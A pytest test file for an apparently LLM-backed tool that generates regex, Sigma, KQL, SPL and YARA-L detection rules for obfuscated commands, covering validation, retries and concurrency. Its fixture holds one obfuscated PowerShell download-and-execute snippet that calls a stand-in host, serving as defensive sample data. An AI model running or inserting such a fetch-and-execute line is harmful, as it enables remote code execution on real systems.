"""Tests for globwarden.engine.generate.generate_rules and its validators."""

from __future__ import annotations

import json

import pytest

from globwarden.engine.generate import GenerationError, generate_rules
from globwarden.models import ObfuscationCategory, ObfuscationFinding, RuleType

from .conftest import (
    VALID_KQL_LINE,
    VALID_REGEX_PATTERN,
    VALID_SIGMA_DETECTION_BLOCK,
    VALID_SPL_LINE,
    VALID_YARA_L_LINE,
    combined_response_json,
    regex_response_json,
)


def _finding(finding_id: str = "f1") -> ObfuscationFinding:
    return ObfuscationFinding(
        id=finding_id,
        category=ObfuscationCategory.WILDCARD_RESOLUTION,
        technique_name="Wildcard Get-Alias resolution of Invoke-Expression",
        description="Resolves iex via a wildcarded Get-Alias call, then invokes it.",
        example_snippet="&(Get-Alias i*x) (irm https://example.com/a)",
        confidence=0.9,
        attack_mapping="T1027.010 (parent: T1027)",
    )


class TestRegexValidation:
    def test_valid_pattern_compiles_and_is_marked_valid(self, mock_provider_factory):
        response = combined_response_json({RuleType.REGEX: (VALID_REGEX_PATTERN, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.REGEX], provider)

        assert len(rules) == 1
        rule = rules[0]
        assert rule.rule_type == RuleType.REGEX
        assert rule.valid is True
        assert rule.validation_note is None
        import re

        re.compile(rule.content)  # must not raise

    def test_broken_pattern_retried_then_fixed(self, mock_provider_factory):
        broken = r"(?i)&\s*\(unclosed[grp"  # genuinely invalid: unterminated character set
        fixed = VALID_REGEX_PATTERN
        combined = combined_response_json({RuleType.REGEX: (broken, "explains it")})
        retry = regex_response_json(fixed)
        provider = mock_provider_factory(responses=[combined, retry])

        rules = generate_rules([_finding()], [RuleType.REGEX], provider)

        assert provider.call_count == 2  # combined call + one narrow retry
        assert rules[0].valid is True
        assert rules[0].content == fixed

    def test_broken_pattern_still_broken_after_retry_is_flagged_invalid(self, mock_provider_factory):
        broken = r"(?i)&\s*\(unclosed[grp"
        combined = combined_response_json({RuleType.REGEX: (broken, "explains it")})
        retry = regex_response_json(broken)
        provider = mock_provider_factory(responses=[combined, retry])

        rules = generate_rules([_finding()], [RuleType.REGEX], provider)

        assert provider.call_count == 2
        rule = rules[0]
        assert rule.valid is False
        assert rule.validation_note is not None
        assert "compile" in rule.validation_note.lower() or "re module" in rule.validation_note.lower()
        # Never silently dropped — the broken content is still returned.
        assert rule.content == broken

    def test_missing_pattern_key_flagged_invalid_not_silently_valid(self, mock_provider_factory):
        # Regression test: a well-formed JSON object simply missing the
        # "pattern" key used to default to content='' via parsed.get(...), and
        # re.compile('') succeeds (empty string is valid Python regex) -- so
        # this silently produced valid=True for a functionally useless rule.
        combined = json.dumps({"regex": {"explanation": "couldn't determine a pattern"}})
        retry = regex_response_json("")
        provider = mock_provider_factory(responses=[combined, retry])

        rules = generate_rules([_finding()], [RuleType.REGEX], provider)

        rule = rules[0]
        assert rule.valid is False
        assert rule.validation_note is not None

    def test_empty_string_pattern_flagged_invalid(self, mock_provider_factory):
        combined = combined_response_json({RuleType.REGEX: ("", "explains it")})
        retry = regex_response_json("")
        provider = mock_provider_factory(responses=[combined, retry])
        rules = generate_rules([_finding()], [RuleType.REGEX], provider)

        rule = rules[0]
        assert rule.valid is False
        assert "empty" in rule.validation_note.lower()


class TestSigmaValidation:
    def test_valid_sigma_detection_block_parses_and_is_marked_valid(self, mock_provider_factory):
        response = combined_response_json({RuleType.SIGMA: (VALID_SIGMA_DETECTION_BLOCK, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.SIGMA], provider)

        rule = rules[0]
        assert rule.valid is True
        assert rule.validation_note is None
        import yaml

        parsed = yaml.safe_load(rule.content)
        assert "condition" in parsed
        # GlobWarden asks for just the detection block now -- no full-rule
        # wrapper fields should be expected or present.
        assert "title" not in parsed
        assert "logsource" not in parsed

    def test_sigma_missing_condition_key_is_flagged(self, mock_provider_factory):
        no_condition = "selection:\n  CommandLine|re: 'foo'\n"
        response = combined_response_json({RuleType.SIGMA: (no_condition, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.SIGMA], provider)

        rule = rules[0]
        assert rule.valid is False
        assert rule.validation_note is not None
        assert "condition" in rule.validation_note

    def test_sigma_condition_with_no_selection_is_flagged(self, mock_provider_factory):
        condition_only = "condition: selection\n"
        response = combined_response_json({RuleType.SIGMA: (condition_only, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.SIGMA], provider)

        rule = rules[0]
        assert rule.valid is False
        assert "selection" in rule.validation_note.lower()

    def test_sigma_broken_yaml_is_flagged_not_crashed(self, mock_provider_factory):
        broken_yaml = "selection:\n  bad indent: [unclosed\ncondition: - x\n  - y\n:::not yaml"
        response = combined_response_json({RuleType.SIGMA: (broken_yaml, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.SIGMA], provider)

        rule = rules[0]
        assert rule.valid is False
        assert rule.validation_note is not None

    def test_sigma_not_a_mapping_is_flagged(self, mock_provider_factory):
        response = combined_response_json({RuleType.SIGMA: ("- just\n- a\n- list\n", "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.SIGMA], provider)

        rule = rules[0]
        assert rule.valid is False
        assert "mapping" in rule.validation_note.lower()


class TestLineValidation:
    def test_valid_kql_line_passes(self, mock_provider_factory):
        response = combined_response_json({RuleType.KQL: (VALID_KQL_LINE, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.KQL], provider)
        assert rules[0].valid is True

    def test_valid_spl_line_passes(self, mock_provider_factory):
        response = combined_response_json({RuleType.SPL: (VALID_SPL_LINE, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.SPL], provider)
        assert rules[0].valid is True

    def test_valid_yara_l_line_passes(self, mock_provider_factory):
        response = combined_response_json({RuleType.YARA_L: (VALID_YARA_L_LINE, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.YARA_L], provider)
        assert rules[0].valid is True

    def test_empty_content_flagged_invalid(self, mock_provider_factory):
        response = combined_response_json({RuleType.KQL: ("   ", "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.KQL], provider)
        assert rules[0].valid is False
        assert "empty" in rules[0].validation_note.lower()

    def test_unbalanced_parens_flagged_invalid(self, mock_provider_factory):
        broken = 'ProcessCommandLine matches regex @"(?i)unclosed('
        response = combined_response_json({RuleType.KQL: (broken, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.KQL], provider)
        assert rules[0].valid is False
        assert "unbalanced" in rules[0].validation_note.lower()

    def test_kql_missing_regex_operator_flagged(self, mock_provider_factory):
        not_regex_based = 'ProcessCommandLine has_any ("gal", "Get-Alias")'
        response = combined_response_json({RuleType.KQL: (not_regex_based, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.KQL], provider)
        assert rules[0].valid is False
        assert "regex" in rules[0].validation_note.lower()

    def test_spl_missing_regex_operator_flagged(self, mock_provider_factory):
        not_regex_based = 'search CommandLine="*gal*"'
        response = combined_response_json({RuleType.SPL: (not_regex_based, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.SPL], provider)
        assert rules[0].valid is False
        assert "regex" in rules[0].validation_note.lower()

    def test_yara_l_missing_udm_field_reference_flagged(self, mock_provider_factory):
        not_a_field_ref = '"just a quoted string, not a UDM field match"'
        response = combined_response_json({RuleType.YARA_L: (not_a_field_ref, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.YARA_L], provider)
        assert rules[0].valid is False
        assert "udm" in rules[0].validation_note.lower()

    def test_escaped_literal_parens_do_not_trip_bracket_balance_check(self, mock_provider_factory):
        # Regression: a legitimate pattern matching a literal, backslash-
        # escaped closing paren used to be wrongly flagged "unbalanced" --
        # the balance check counted every ')' character regardless of
        # whether it was escaped as a literal.
        line = 'regex ScriptBlockText="(?i)\\)"'
        response = combined_response_json({RuleType.SPL: (line, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.SPL], provider)
        assert rules[0].valid is True

    def test_yara_l_dollar_figure_does_not_pass_as_udm_field_reference(self, mock_provider_factory):
        # Regression: the old UDM-field check ('\$\w+\.') matched any
        # "$word." shape, including a plain dollar figure like "$100.50" --
        # not a real UDM field path.
        line = "this technique costs about $100.50 in false positives to run"
        response = combined_response_json({RuleType.YARA_L: (line, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.YARA_L], provider)
        assert rules[0].valid is False

    def test_kql_word_regex_as_a_substring_does_not_pass_as_a_regex_operator(self, mock_provider_factory):
        # Regression: the old check was a bare `"regex" in lowered`
        # substring test, so a line containing "regex" as part of an
        # unrelated word (not the actual operator) incorrectly passed.
        line = 'ProcessCommandLine has "totallyregexlike"'
        response = combined_response_json({RuleType.KQL: (line, "explains it")})
        provider = mock_provider_factory(responses=[response])
        rules = generate_rules([_finding()], [RuleType.KQL], provider)
        assert rules[0].valid is False


class TestGenerationErrorHandling:
    def test_garbage_response_raises_generation_error(self, mock_provider_factory):
        provider = mock_provider_factory(responses=["not json at all, sorry"])
        with pytest.raises(GenerationError):
            generate_rules([_finding()], [RuleType.KQL], provider)


class TestMalformedShapeCrashRegression:
    """Regression coverage for a previously-reported crash: `generate_rules()`
    must raise `GenerationError` (never an unhandled `AttributeError`) when the
    LLM returns text that IS valid JSON but ISN'T a top-level object — a bare
    array or JSON `null`. `json.loads()` accepts both of those as valid
    top-level JSON, so `extract_json_object()` happily returns a `list`/`None`
    and `_call_and_parse`'s `isinstance(parsed, dict)` guard is exactly what
    catches this before any section-lookup code gets a chance to blow up with
    a raw `AttributeError`.
    """

    @pytest.mark.parametrize(
        "rule_type",
        [RuleType.REGEX, RuleType.KQL, RuleType.SPL, RuleType.YARA_L, RuleType.SIGMA],
    )
    @pytest.mark.parametrize("bad_response", ["[1, 2, 3]", "null"], ids=["top-level-array", "top-level-null"])
    def test_non_dict_top_level_json_raises_generation_error_not_attribute_error(
        self, mock_provider_factory, rule_type, bad_response
    ):
        provider = mock_provider_factory(responses=[bad_response])

        # pytest.raises(GenerationError) fails the test outright if an
        # AttributeError (or anything else) escapes instead — that's the
        # regression this test guards against for every rule type.
        with pytest.raises(GenerationError) as exc_info:
            generate_rules([_finding()], [rule_type], provider)

        assert "not a JSON object" in str(exc_info.value)


class TestMultipleFindingsAndRuleTypes:
    def test_one_combined_call_per_finding_covers_every_requested_type(self, mock_provider_factory):
        def _responder(system_prompt: str, user_prompt: str) -> str:
            return combined_response_json(
                {
                    RuleType.REGEX: (VALID_REGEX_PATTERN, "explains it"),
                    RuleType.SIGMA: (VALID_SIGMA_DETECTION_BLOCK, "explains it"),
                }
            )

        provider = mock_provider_factory(responder=_responder)
        findings = [_finding("f1"), _finding("f2")]

        rules = generate_rules(findings, [RuleType.REGEX, RuleType.SIGMA], provider)

        # One call per finding (not one per finding-per-rule-type) -- the
        # whole point of batching every requested format into a single
        # combined response.
        assert provider.call_count == 2
        assert len(rules) == 4
        assert all(r.valid for r in rules)

        # Order matches `findings` order regardless of which thread's call
        # completed first.
        assert [(r.finding_id, r.rule_type) for r in rules] == [
            ("f1", RuleType.REGEX),
            ("f1", RuleType.SIGMA),
            ("f2", RuleType.REGEX),
            ("f2", RuleType.SIGMA),
        ]

    def test_concurrent_findings_each_get_their_own_matching_content(self, mock_provider_factory):
        # Each finding's combined call must get *that finding's* content, not
        # an arbitrary one from a shared list -- proves the responder sees the
        # right finding even when calls run concurrently across threads.
        def _responder(system_prompt: str, user_prompt: str) -> str:
            import re

            match = re.search(r"Technique: (.+)", user_prompt)
            technique = match.group(1) if match else "unknown"
            return combined_response_json({RuleType.REGEX: (technique, "explains it")})

        findings = [
            ObfuscationFinding(
                id=f"f{i}",
                category=ObfuscationCategory.OTHER,
                technique_name=f"technique-{i}",
                description="desc",
                example_snippet=None,
                confidence=0.5,
                attack_mapping="T1027.010 (parent: T1027)",
            )
            for i in range(1, 11)
        ]
        provider = mock_provider_factory(responder=_responder)

        rules = generate_rules(findings, [RuleType.REGEX], provider)

        # re.compile() on a technique name string containing e.g. "technique-3"
        # only "succeeds as a pattern" coincidentally -- what actually matters
        # here is that each finding's rule content traces back to that same
        # finding's own technique name, proving no cross-talk between
        # concurrently-running calls.
        by_finding = {r.finding_id: r.content for r in rules}
        for finding in findings:
            assert by_finding[finding.id] == finding.technique_name


class TestConcurrencyFailsFast:
    def test_first_failure_cancels_not_yet_started_calls(self, mock_provider_factory):
        # Regression: an early GenerationError used to still let every
        # already-queued call run to completion before raising (no fail-fast
        # savings) -- directly undercutting the reason concurrency exists in
        # the first place (cutting cost/latency on a large scan). Finding
        # "t1" fails immediately (no sleep); everything else sleeps briefly.
        # With max_concurrency well under the finding count, most findings
        # should still be sitting unstarted in the queue when "t1"'s
        # near-instant failure is detected, so they get cancelled rather
        # than run.
        import time

        findings = [
            ObfuscationFinding(
                id=f"f{i}",
                category=ObfuscationCategory.OTHER,
                technique_name=f"t{i}",
                description="d",
                example_snippet=None,
                confidence=0.5,
                attack_mapping="T1027.010 (parent: T1027)",
            )
            for i in range(1, 21)
        ]

        def _responder(system_prompt: str, user_prompt: str) -> str:
            if "Technique: t1\n" in user_prompt:
                return "not valid json, sorry"
            time.sleep(0.2)
            return combined_response_json({RuleType.REGEX: (VALID_REGEX_PATTERN, "explains it")})

        provider = mock_provider_factory(responder=_responder)

        with pytest.raises(GenerationError):
            generate_rules(findings, [RuleType.REGEX], provider, max_concurrency=3)

        # Not all 20 findings' calls should have gone out -- most were still
        # queued (never started) when the failure was detected and cancelled.
        assert provider.call_count < len(findings)


class TestEmptyInputs:
    def test_no_findings_makes_no_calls(self, mock_provider_factory):
        provider = mock_provider_factory(responses=[])
        rules = generate_rules([], [RuleType.REGEX], provider)
        assert rules == []
        assert provider.call_count == 0

    def test_no_rule_types_makes_no_calls(self, mock_provider_factory):
        provider = mock_provider_factory(responses=[])
        rules = generate_rules([_finding()], [], provider)
        assert rules == []
        assert provider.call_count == 0
